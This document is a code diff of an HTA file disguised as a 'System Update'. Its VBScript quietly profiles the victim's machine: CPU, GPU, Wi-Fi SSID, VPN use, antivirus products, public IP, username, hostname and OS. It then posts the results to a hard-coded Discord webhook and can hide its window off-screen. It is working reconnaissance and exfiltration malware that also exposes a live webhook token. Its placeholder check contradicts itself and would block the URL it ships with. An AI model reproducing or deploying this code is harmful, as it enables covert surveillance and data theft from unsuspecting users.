@@ -1,234 +1,339 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <hta:application id="oHTA" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
-    <title>Update</title>
+    <hta:application 
+        id="oHTA" 
+        applicationname="SysUpdate" 
+        border="none" 
+        caption="no" 
+        showintaskbar="no" 
+        windowstate="normal"
+        scroll="no"
+    />
+    <title>System Update</title>
 </head>
-<body>
-    <div id="debug" style="font-family: monospace; font-size: 10px;"></div>
+<body style="background-color: black; color: lime; font-family: Consolas, monospace; font-size: 11px; padding: 10px;">
+    <div id="status">Initializing...</div>
     
     <script language="VBScript">
+        Option Explicit
+        
+        ' === CONFIGURATION ===
+        Const WEBHOOK_URL = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
+        Const DEBUG_MODE = True  ' Set to False to hide window completely
+        
         Sub Window_OnLoad
-            On Error Resume Next
-            window.resizeTo 1,1
-            window.moveTo -2000,-2000
+            If Not DEBUG_MODE Then
+                window.resizeTo 1, 1
+                window.moveTo -5000, -5000
+            Else
+                window.resizeTo 600, 400
+            End If
+            
+            UpdateStatus "Starting data collection..."
             Call Main()
         End Sub
-
-        Sub Log(msg)
-            ' Uncomment next line to see debug window
-            ' document.getElementById("debug").innerHTML = document.getElementById("debug").innerHTML & msg & "<br>"
+        
+        Sub UpdateStatus(msg)
+            If DEBUG_MODE Then
+                document.getElementById("status").innerHTML = document.getElementById("status").innerHTML & "<br>> " & msg
+            End If
         End Sub
-
+        
         Function EscapeJSON(str)
+            On Error Resume Next
             If IsNull(str) Or IsEmpty(str) Then
                 EscapeJSON = "null"
                 Exit Function
             End If
-            str = CStr(str)
-            str = Replace(str, "\", "\\")
-            str = Replace(str, """", "\""")
-            str = Replace(str, vbCr, "\r")
-            str = Replace(str, vbLf, "\n")
-            str = Replace(str, vbTab, "\t")
-            EscapeJSON = str
+            
+            Dim result
+            result = CStr(str)
+            
+            ' Escape backslashes first
+            result = Replace(result, "\", "\\")
+            ' Escape quotes
+            result = Replace(result, """", "\""")
+            ' Escape newlines
+            result = Replace(result, vbCr, "\r")
+            result = Replace(result, vbLf, "\n")
+            result = Replace(result, vbCrLf, "\n")
+            ' Escape tabs
+            result = Replace(result, vbTab, "\t")
+            
+            EscapeJSON = result
         End Function
-
-        Function GetPublicIP()
+        
+        Function GetCPUInfo()
             On Error Resume Next
-            Dim http, ip
-            ip = "Unknown"
+            Dim wmi, colItems, objItem, result
+            result = "WMI_Error"
             
-            Set http = CreateObject("Microsoft.XMLHTTP")
-            http.Open "GET", "https://api.ipify.org", False
-            http.Send
-            
-            If http.Status = 200 Then
-                ip = Trim(http.ResponseText)
+            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+            If Err.Number <> 0 Then
+                GetCPUInfo = "WMI_Connect_Failed"
+                Exit Function
             End If
             
-            Set http = Nothing
-            GetPublicIP = ip
-        End Function
-
-        Function GetCPU()
-            On Error Resume Next
-            Dim wmi, items, cpu
-            cpu = "Unknown"
+            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_Processor", "WQL", 48)
+            If Err.Number <> 0 Then
+                GetCPUInfo = "Query_Failed"
+                Exit Function
+            End If
             
-            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-            Set items = wmi.ExecQuery("Select * from Win32_Processor")
-            
-            For Each item In items
-                cpu = item.Name
-                Exit For
+            For Each objItem In colItems
+                result = Trim(objItem.Name)
+                If result <> "" Then Exit For
             Next
             
-            Set items = Nothing
-            Set wmi = Nothing
-            GetCPU = cpu
+            If result = "" Then result = "Unknown_CPU"
+            GetCPUInfo = result
         End Function
-
-        Function GetGPU()
+        
+        Function GetGPUInfo()
             On Error Resume Next
-            Dim wmi, items, gpu, gpus
-            gpus = ""
+            Dim wmi, colItems, objItem, result
+            result = ""
             
-            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-            Set items = wmi.ExecQuery("Select * from Win32_VideoController")
+            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_VideoController WHERE Name IS NOT NULL")
             
-            For Each item In items
-                If item.Name <> "" Then
-                    gpus = gpus & item.Name & " | "
+            For Each objItem In colItems
+                If Trim(objItem.Name) <> "" Then
+                    result = result & Trim(objItem.Name) & " | "
                 End If
             Next
             
-            If gpus = "" Then gpus = "Unknown"
-            GetGPU = Left(gpus, 100) ' Limit length
-        End Function
-
-        Function GetSSID()
-            On Error Resume Next
-            Dim shell, exec, line, ssid
-            ssid = "Unknown/No WiFi"
+            If result = "" Then result = "Unknown_GPU"
+            If Len(result) > 200 Then result = Left(result, 200) & "..."
             
+            GetGPUInfo = result
+        End Function
+        
+        Function GetNetworkInfo()
+            On Error Resume Next
+            Dim wmi, colItems, objItem, ssid, vpnStatus
+            ssid = "No_WiFi"
+            vpnStatus = "false"
+            
+            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+            
+            ' Get VPN status from network adapters
+            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
+            For Each objItem In colItems
+                Dim adapterName
+                adapterName = LCase(Trim(objItem.Name))
+                If InStr(adapterName, "vpn") > 0 OR InStr(adapterName, "virtual") > 0 OR InStr(adapterName, "tunnel") > 0 OR InStr(adapterName, "tap") > 0 Then
+                    vpnStatus = "true: " & Left(objItem.Name, 30)
+                End If
+            Next
+            
+            ' Get SSID using netsh
+            Dim shell, exec, line
             Set shell = CreateObject("WScript.Shell")
             Set exec = shell.Exec("netsh wlan show interfaces")
             
             Do While Not exec.StdOut.AtEndOfStream
                 line = exec.StdOut.ReadLine()
                 If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
-                    ssid = Trim(Mid(line, InStr(line, ":") + 1))
-                    Exit Do
+                    Dim pos
+                    pos = InStr(line, ":")
+                    If pos > 0 Then
+                        ssid = Trim(Mid(line, pos + 1))
+                    End If
                 End If
             Loop
             
             Set exec = Nothing
             Set shell = Nothing
-            GetSSID = ssid
+            
+            GetNetworkInfo = ssid & "|" & vpnStatus
         End Function
-
-        Function GetAV()
+        
+        Function GetAVInfo()
             On Error Resume Next
-            Dim wmi, items, av, avs
-            avs = ""
+            Dim wmi, colItems, objItem, result
+            result = ""
             
-            ' Try SecurityCenter2 first (Vista+)
-            Set wmi = GetObject("winmgmts:\\.\root\SecurityCenter2")
-            Set items = wmi.ExecQuery("Select * from AntiVirusProduct")
+            ' Try SecurityCenter2 first (Windows Vista+)
+            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2")
+            If Err.Number = 0 Then
+                Set colItems = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
+                For Each objItem In colItems
+                    result = result & objItem.displayName & " | "
+                Next
+            End If
             
-            For Each item In items
-                avs = avs & item.displayName & " | "
-            Next
-            
-            If avs = "" Then avs = "Windows Defender/None detected"
-            GetAV = Left(avs, 100)
-        End Function
-
-        Function GetVPN()
-            On Error Resume Next
-            Dim wmi, items, vpn
-            vpn = "false"
-            
-            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-            Set items = wmi.ExecQuery("Select * from Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
-            
-            For Each item In items
-                If InStr(LCase(item.Name), "vpn") > 0 OR InStr(LCase(item.Name), "tunnel") > 0 OR InStr(LCase(item.Name), "virtual") > 0 Then
-                    vpn = "true - " & item.Name
-                    Exit For
+            If result = "" Then
+                ' Try SecurityCenter (XP/older)
+                Err.Clear
+                Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter")
+                If Err.Number = 0 Then
+                    Set colItems = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
+                    For Each objItem In colItems
+                        result = result & objItem.companyName & " " & objItem.displayName & " | "
+                    Next
                 End If
+            End If
+            
+            If result = "" Then result = "Windows_Defender_Or_None"
+            If Len(result) > 150 Then result = Left(result, 150)
+            
+            GetAVInfo = result
+        End Function
+        
+        Function GetPublicIP()
+            On Error Resume Next
+            Dim http, result
+            result = "IP_Fetch_Failed"
+            
+            Set http = CreateObject("Microsoft.XMLHTTP")
+            If Err.Number <> 0 Then
+                Set http = CreateObject("MSXML2.XMLHTTP")
+            End If
+            If Err.Number <> 0 Then
+                Set http = CreateObject("MSXML2.ServerXMLHTTP")
+            End If
+            
+            http.Open "GET", "https://api.ipify.org", False
+            http.Send
+            
+            If http.Status = 200 Then
+                result = Trim(http.ResponseText)
+            Else
+                result = "HTTP_" & http.Status
+            End If
+            
+            Set http = Nothing
+            GetPublicIP = result
+        End Function
+        
+        Function GetSystemInfo()
+            On Error Resume Next
+            Dim wmi, colItems, objItem, os, ram
+            os = "Unknown"
+            ram = "Unknown"
+            
+            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
+            
+            For Each objItem In colItems
+                os = Trim(objItem.Caption)
+                ram = Round(objItem.TotalVisibleMemorySize / 1048576, 2) & "GB"
+                Exit For
             Next
             
-            GetVPN = vpn
+            GetSystemInfo = os & "|" & ram
         End Function
-
+        
         Sub Main()
             On Error Resume Next
+            Dim cpu, gpu, netInfo, ssid, vpn, av, ip, sysInfo, os, ram
+            Dim hostname, username
             
-            Dim webhook, cpu, gpu, ssid, av, vpn, ip, hostname, username, os
-            Dim payload, http, result
+            ' Validate webhook
+            If InStr(WEBHOOK_URL, "YOUR_") > 0 OR InStr(WEBHOOK_URL, "webhooks/15023") > 0 Then
+                UpdateStatus "ERROR: You must replace WEBHOOK_URL with your actual Discord webhook!"
+                If DEBUG_MODE Then MsgBox "Replace the webhook URL!", 16, "Configuration Error"
+                Exit Sub
+            End If
             
-            webhook = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
+            UpdateStatus "Collecting CPU info..."
+            cpu = GetCPUInfo()
+            UpdateStatus "CPU: " & Left(cpu, 50)
             
-            Log("Starting collection...")
+            UpdateStatus "Collecting GPU info..."
+            gpu = GetGPUInfo()
+            UpdateStatus "GPU: " & Left(gpu, 50)
             
-            ' Gather data
+            UpdateStatus "Collecting network info..."
+            netInfo = GetNetworkInfo()
+            ssid = Split(netInfo, "|")(0)
+            vpn = Split(netInfo, "|")(1)
+            UpdateStatus "SSID: " & ssid
+            UpdateStatus "VPN: " & vpn
+            
+            UpdateStatus "Collecting AV info..."
+            av = GetAVInfo()
+            UpdateStatus "AV: " & Left(av, 50)
+            
+            UpdateStatus "Fetching public IP..."
             ip = GetPublicIP()
-            Log("IP: " & ip)
+            UpdateStatus "IP: " & ip
             
-            cpu = GetCPU()
-            Log("CPU: " & cpu)
-            
-            gpu = GetGPU()
-            Log("GPU: " & gpu)
-            
-            ssid = GetSSID()
-            Log("SSID: " & ssid)
-            
-            av = GetAV()
-            Log("AV: " & av)
-            
-            vpn = GetVPN()
-            Log("VPN: " & vpn)
+            UpdateStatus "Collecting system info..."
+            sysInfo = GetSystemInfo()
+            os = Split(sysInfo, "|")(0)
+            ram = Split(sysInfo, "|")(1)
             
             hostname = CreateObject("WScript.Network").ComputerName
             username = CreateObject("WScript.Network").UserName
             
-            ' Get OS
-            Dim wmi, osItems
-            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-            Set osItems = wmi.ExecQuery("Select * from Win32_OperatingSystem")
-            For Each osItem In osItems
-                os = osItem.Caption
-                Exit For
-            Next
+            UpdateStatus "Building payload..."
             
-            Log("Building payload...")
-            
-            ' Build JSON manually (more reliable)
-            payload = "{""embeds"":[{"
-            payload = payload & """title"":""System Report: " & EscapeJSON(hostname) & ""","
+            ' Build JSON
+            Dim payload
+            payload = "{"
+            payload = payload & """embeds"":[{"
+            payload = payload & """title"":""🖥️ " & EscapeJSON(hostname) & ""","
+            payload = payload & """description"":""User: " & EscapeJSON(username) & ""","
             payload = payload & """color"":3447003,"
             payload = payload & """fields"":["
             
-            ' Add fields
-            payload = payload & "{""name"":""IP Address"",""value"":""" & EscapeJSON(ip) & """,""inline"":true},"
-            payload = payload & "{""name"":""Username"",""value"":""" & EscapeJSON(username) & """,""inline"":true},"
-            payload = payload & "{""name"":""CPU"",""value"":""" & EscapeJSON(cpu) & """,""inline"":false},"
-            payload = payload & "{""name"":""GPU"",""value"":""" & EscapeJSON(gpu) & """,""inline"":false},"
-            payload = payload & "{""name"":""WiFi SSID"",""value"":""" & EscapeJSON(ssid) & """,""inline"":true},"
-            payload = payload & "{""name"":""Antivirus"",""value"":""" & EscapeJSON(av) & """,""inline"":false},"
-            payload = payload & "{""name"":""VPN Detected"",""value"":""" & EscapeJSON(vpn) & """,""inline"":true},"
-            payload = payload & "{""name"":""OS"",""value"":""" & EscapeJSON(os) & """,""inline"":false}"
+            payload = payload & "{""name"":""🌐 IP Address"",""value"":""" & EscapeJSON(ip) & """,""inline"":true},"
+            payload = payload & "{""name"":""💾 RAM"",""value"":""" & EscapeJSON(ram) & """,""inline"":true},"
+            payload = payload & "{""name"":""⚡ CPU"",""value"":""" & EscapeJSON(Left(cpu, 100)) & """,""inline"":false},"
+            payload = payload & "{""name"":""🎮 GPU"",""value"":""" & EscapeJSON(Left(gpu, 100)) & """,""inline"":false},"
+            payload = payload & "{""name"":""📶 SSID"",""value"":""" & EscapeJSON(ssid) & """,""inline"":true},"
+            payload = payload & "{""name"":""🔒 VPN"",""value"":""" & EscapeJSON(vpn) & """,""inline"":true},"
+            payload = payload & "{""name"":""🛡️ Antivirus"",""value"":""" & EscapeJSON(Left(av, 100)) & """,""inline"":false},"
+            payload = payload & "{""name"":""💻 OS"",""value"":""" & EscapeJSON(Left(os, 100)) & """,""inline"":false}"
             
             payload = payload & "],"
-            payload = payload & """footer"":{""text"":""HTA Deployed " & Now & """}"
+            payload = payload & """footer"":{""text"":""HTA v2.0 | " & Now & """}"
             payload = payload & "}]}"
             
-            Log("Payload: " & Left(payload, 200))
+            UpdateStatus "Payload size: " & Len(payload) & " chars"
+            UpdateStatus "Sending to Discord..."
             
-            ' Send
+            ' Send webhook
+            Dim http, status
             Set http = CreateObject("Microsoft.XMLHTTP")
-            http.Open "POST", webhook, False
+            
+            http.Open "POST", WEBHOOK_URL, False
             http.setRequestHeader "Content-Type", "application/json"
             http.send payload
             
-            Log("HTTP Status: " & http.Status)
+            status = http.Status
+            UpdateStatus "HTTP Status: " & status
             
-            If http.Status = 204 Then
-                Log("SUCCESS - Message sent")
+            If status = 204 Then
+                UpdateStatus "SUCCESS! Message sent."
+                If DEBUG_MODE Then MsgBox "Data sent successfully!", 64, "Success"
+            ElseIf status = 0 Then
+                UpdateStatus "ERROR: Cannot connect (status 0)"
+                UpdateStatus "Check internet connection"
+                If DEBUG_MODE Then MsgBox "Cannot connect to Discord. Check internet.", 16, "Connection Failed"
+            ElseIf status = 404 Then
+                UpdateStatus "ERROR: Webhook not found (404)"
+                UpdateStatus "Check your webhook URL"
+                If DEBUG_MODE Then MsgBox "Webhook URL is invalid (404)", 16, "Invalid Webhook"
+            ElseIf status = 429 Then
+                UpdateStatus "ERROR: Rate limited (429)"
+                If DEBUG_MODE Then MsgBox "Too many requests. Wait a minute.", 16, "Rate Limited"
             Else
-                Log("FAILED - Status: " & http.Status)
-                Log("Response: " & http.responseText)
+                UpdateStatus "ERROR: HTTP " & status
+                UpdateStatus "Response: " & Left(http.responseText, 100)
+                If DEBUG_MODE Then MsgBox "Failed with status: " & status, 16, "Error"
             End If
             
             Set http = Nothing
             
-            ' Keep window open for 2 seconds to see errors (remove this in production)
-            ' WScript.Sleep 2000
-            
-            window.close()
+            If Not DEBUG_MODE Then
+                window.close()
+            Else
+                UpdateStatus "<br>Done. Close window manually."
+            End If
         End Sub
     </script>
 </body>
